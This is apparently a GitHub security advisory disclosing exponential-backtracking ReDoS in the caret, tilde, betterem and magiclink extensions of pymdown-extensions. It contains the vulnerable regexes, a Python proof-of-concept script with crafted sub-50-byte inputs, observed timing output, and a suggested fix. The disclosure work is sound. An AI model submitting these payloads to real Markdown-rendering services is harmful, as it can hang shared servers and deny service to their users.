# [H] pymdown-extensions: exponential-backtracking ReDoS in caret, tilde, betterem, and magiclink inline processors

## Summary
Severity: High
Advisory: GHSA-gm37-52c6-37mw
CVE: CVE-2026-67422
CWE: CWE-1333
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-07
Source: https://github.com/advisories/GHSA-gm37-52c6-37mw
Type: github-advisory

## Affected
- PyPI: `pymdown-extensions` — affected >=0 <11.0.1

## Details
### Summary

Four inline processors in pymdown-extensions contain regular expressions with
exponential backtracking. A single untrusted Markdown line under
50 bytes drives `markdown.markdown()` into unbounded CPU on the rendering thread
(seconds at ~45 bytes, growing exponentially with each added character). All four
fire in the extension's **default configuration**
and are reachable through the documented public API. The `caret`/`tilde`/
`betterem` blow-up was introduced by the emphasis-pattern rewrite in PR #2547
(first released in **10.13**, Dec 2024) — earlier releases used a linear
`(.+?)` / `([^\s]+?)` content group — and is present through **11.0** (latest);
`magiclink`'s host pattern is long-standing and affects effectively all releases.
Likely **CWE-1333 (Inefficient Regular Expression Complexity)**.

This is a distinct issue from CVE-2025-68142 (ReDoS in `pymdownx.blocks.caption`,
`RE_FIG_NUM`, fixed in 10.16.1): different extensions, different regexes, and a
different root cause (delimiter-run partition ambiguity rather than a `.`/`\.`
typo).

### Details

Four regexes share, or closely mirror, a vulnerable shape — an inner group that
can partition a run of the delimiter character into `{2,}`-sized pieces in
exponentially many ways, wrapped in a lazy `+?` that must fail before the engine
can give up:

| Extension | Regex | Location (`11.0`) |
|---|---|---|
| `pymdownx.caret` (superscript `^…^`) | `SUP2` | `pymdownx/caret.py:56` |
| `pymdownx.tilde` (subscript `~…~`) | `SUB2` | `pymdownx/tilde.py:55` |
| `pymdownx.betterem` (underscore `_…_`) | `SMART_UNDER_EM2` (default) | `pymdownx/betterem.py:93` |
| `pymdownx.magiclink` (bare-URL autolink) | `RE_LINK` | `pymdownx/magiclink.py:56` (host at `:59`) |

`pymdownx/caret.py:56` (`pymdown-extensions 11.0`):

```python
SUP2 = r'(?<!\^)(\^)(?![\^\s])((?:[^\^\s]|\^{2,})+?)(?<![\^\s])(\^)(?!\^)'
```

The content group `(?:[^\^\s]|\^{2,})+?` matches a run of carets only via the
`\^{2,}` branch. A run of *k* carets can be split into ≥2-length pieces in
exponentially many combinations; when no caret can serve as a valid closing
delimiter (the trailing `(?<![\^\s])(\^)` cannot be satisfied), the engine
explores every partition before failing. `SUB2` (tilde) and `SMART_UNDER_EM2`
(betterem) are the same construct for `~` and `_`. In `betterem` the default
`smart_enable='underscore'` routes underscores to `SmartUnderscoreProcessor` →
`SMART_UNDER_EM2` (`betterem.py:93`), which is the default-reachable,
API-exploitable pattern; the non-smart `UNDER_EM2` (`:69`, used only when
`smart_enable` is `asterisk`/`disable`) shares the shape but did not reproduce
through the public `markdown.markdown()` pipeline on the tested payload, so a fix
and regression test should target `SMART_UNDER_EM2`.

`pymdownx/magiclink.py:59` has the analogous ambiguity in the host portion, where
overlapping character classes let a run of dots be grouped exponentially:

```python
(?:ht|f)tps?://[^_\W][-\w]*(?:\.[-\w.]+)*    # host: '\.' and '[-\w.]' inside (?:...)* both match '.'
```

`SUP2`/`SUB2`/`SMART_UNDER_EM2` are applied at each delimiter occurrence via the
default `PatternSequenceProcessor` subclasses (`pymdownx/util.py`); `RE_LINK` is
applied by `MagiclinkPattern` (registered unconditionally at priority 85). In all
four cases, rendering `markdown.markdown(src, extensions=[ext])` on untrusted
`src` in default configuration is sufficient to reach the regex.

### PoC

Single self-contained script; runs against the pinned release in an ephemeral
env. Non-destructive — the input is ordinary Markdown text; the impact is CPU/time
(a per-render alarm caps each attempt so the script terminates).

```python
import signal
import time
from importlib.metadata import version

import markdown

print(f"# pymdown-extensions {version('pymdown-extensions')} / markdown {version('markdown')}")

CAP = 5.0  # a single render exceeding this is treated as a hang


class Timeout(Exception):
    pass


def render(ext, text):
    signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(Timeout()))
    signal.setitimer(signal.ITIMER_REAL, CAP)
    t = time.perf_counter()
    try:
        markdown.markdown(text, extensions=[ext])
        return time.perf_counter() - t
    except Timeout:
        return None
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)


# ext -> (malicious builder, benign builder [valid & closed], ramp, hang count)
CASES = {
    "pymdownx.caret":     (lambda n: "^a" + "^" * n + "b",       lambda n: "^" + "a" * n + "^",           [24, 30, 36], 44),
    "pymdownx.tilde":     (lambda n: "~a" + "~" * n + "b",       lambda n: "~" + "a" * n + "~",           [24, 30, 36], 44),
    "pymdownx.betterem":  (lambda n: "_a" + "_" * n + "b",       lambda n: "_" + "a" * n + "_",           [24, 30, 36], 44),
    "pymdownx.magiclink": (lambda n: "http://a" + "." * n + " ", lambda n: "http://" + "a" * n + ".com ", [28, 32, 36], 40),
}

repro = []
for ext, (evil, benign, ramp, hang) in CASES.items():
    base_txt = benign(hang)  # valid, closed run: same regex machinery, but linear
    base = render(ext, base_txt)
    print(f"\n[{ext}]  benign baseline (len {len(base_txt)}, valid+closed): {base * 1e3:.3f} ms")
    prev = None
    for n in ramp:
        txt = evil(n)
        dt = render(ext, txt)
        ratio = f"  (x{dt / prev:.1f})" if (prev and dt) else ""
        shown = f"{dt:8.3f} s" if dt is not None else f"> {CAP:.0f} s (HANG)"
        print(f"          malicious len {len(txt):3d}: {shown}{ratio}")
        prev = dt
    txt = evil(hang)
    dt = render(ext, txt)
    hung = dt is None
    print(f"          malicious len {len(txt):3d}: "
          f"{'> %.0f s (HANG)' % CAP if hung else '%.3f s' % dt}")
    ok = base < 0.05 and (hung or dt > 1.0)
    repro.append(ok)
    print(f"          => {'REPRODUCED' if ok else 'not reproduced'}: a {len(txt)}-byte "
          f"malicious line stalls the renderer; a valid {len(base_txt)}-byte line is instant.")

assert all(repro), "not reproduced"
print("\nVERDICT: exponential ReDoS reproduced in all four extensions via the "
      "public markdown.markdown() API, default config (each < 50-byte input).")
```

Run:

```bash
uv run --with pymdown-extensions==11.0 --with markdown==3.10.2 python poc.py
```

The bug is in pymdown-extensions' own regexes run by the stdlib `re` engine, so it
is independent of the Markdown library version (`markdown` pinned only for
byte-exact output). Observed output:

```
# pymdown-extensions 11.0 / markdown 3.10.2

[pymdownx.caret]  benign baseline (len 46, valid+closed): 11.768 ms
          malicious len  27:    0.003 s
          malicious len  33:    0.054 s  (x16.6)
          malicious len  39:    0.946 s  (x17.6)
          malicious len  47: > 5 s (HANG)
          => REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.

[pymdownx.tilde]  benign baseline (len 46, valid+closed): 5.364 ms
          malicious len  27:    0.003 s
          malicious len  33:    0.053 s  (x17.1)
          malicious len  39:    0.962 s  (x18.2)
          malicious len  47: > 5 s (HANG)
          => REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.

[pymdownx.betterem]  benign baseline (len 46, valid+closed): 3.167 ms
          malicious len  27:    0.003 s
          malicious len  33:    0.052 s  (x17.1)
          malicious len  39:    0.948 s  (x18.1)
          malicious len  47: > 5 s (HANG)
          => REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.

[pymdownx.magiclink]  benign baseline (len 52, valid+closed): 4.935 ms
          malicious len  37:    0.033 s
          malicious len  41:    0.210 s  (x6.4)
          malicious len  45:    1.405 s  (x6.7)
          malicious len  49: > 5 s (HANG)
          => REPRODUCED: a 49-byte malicious line stalls the renderer; a valid 52-byte line is instant.

VERDICT: exponential ReDoS reproduced in all four extensions via the public markdown.markdown() API, default config (each < 50-byte input).
```

The per-step ratio stays roughly constant as the run grows (a fixed multiplicative
factor per fixed-size increment) — the signature of exponential, not polynomial,
backtracking. A valid, closed delimiter run of the same length exercises the same
regex yet renders in well under a millisecond, isolating the cost to the *unclosed*
crafted run. Extending it a few more characters pushes the render time into minutes
and beyond.

### Impact

Denial of service: a sub-50-byte line pins the rendering thread at 100% CPU, with
no memory pressure to trip an OOM killer. Most Material/MkDocs usage renders
trusted author content at build time, but the untrusted-input exposure is concrete
in two settings:

- General Python web apps that render user-supplied Markdown (comments, wikis,
  issue/ticket bodies, chat, live preview) — notably any app using
  `pymdownx.extra`, which bundles `betterem` with the vulnerable default
  `smart_enable='underscore'`, or that reuses a Material-style extension block in
  a runtime renderer.
- Hosted docs/CI systems that build untrusted, user-contributed Markdown, where a
  single crafted line hangs the shared build worker.

- Attacker: unauthenticated, remote (anyone who can submit Markdown).
- Configuration: **default** for each extension.
- Proposed **CWE-1333**. Proposed CVSS 3.1 (as proposed — the maintainer makes
  the final call): `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5, High).

### Suggestion

The vulnerable content groups need to be rewritten so a delimiter run has exactly
one parse, removing the `{2,}` partition ambiguity that lets the engine
re-segment a run on backtracking. For the emphasis patterns, restructuring the
content so a delimiter run is consumed in a single, non-re-partitionable way
(rather than by a `{2,}` branch inside a `+?` group) removes the blow-up; for
`RE_LINK`, disambiguate the host so `.` is matched in exactly one place (a single
labelled-host pattern such as `(?:[-\w]+)(?:\.[-\w]+)*`) rather than by
overlapping classes. Possessive quantifiers / atomic groups are the most direct
tool but require Python 3.11+; since the project supports Python 3.10, a
structural rewrite is the portable option.

A regression fixture per extension (a short delimiter run with no valid closer,
asserted to render under a small time budget) would guard against reintroduction.

### References

- Affected source (`pymdown-extensions 11.0`): `pymdownx/caret.py:56` (`SUP2`),
  `pymdownx/tilde.py:55` (`SUB2`), `pymdownx/betterem.py:93` (`SMART_UNDER_EM2`,
  default; `:69` `UNDER_EM2` shares the shape), `pymdownx/magiclink.py:56`
  (`RE_LINK`, host subexpression at `:59`).
- Novelty: same class as CVE-2025-68142 (`pymdownx.blocks.caption` `RE_FIG_NUM`,
  fixed 10.16.1) but distinct extensions, regexes, and root cause. The
  `caret`/`tilde`/`betterem` content groups gained the vulnerable `{2,}`
  alternation in PR #2547 (v10.13); earlier releases used a linear
  `(.+?)` / `([^\s]+?)` group. `magiclink`'s host pattern is long-standing. None
  of the four has been touched by a prior security fix; all are present in the
  latest release (11.0).

## References
- https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-gm37-52c6-37mw
- https://nvd.nist.gov/vuln/detail/CVE-2026-67422
- https://github.com/facelessuser/pymdown-extensions/commit/c68498598d7b13011bb4571350b6e3612a4ce44b
- https://github.com/facelessuser/pymdown-extensions
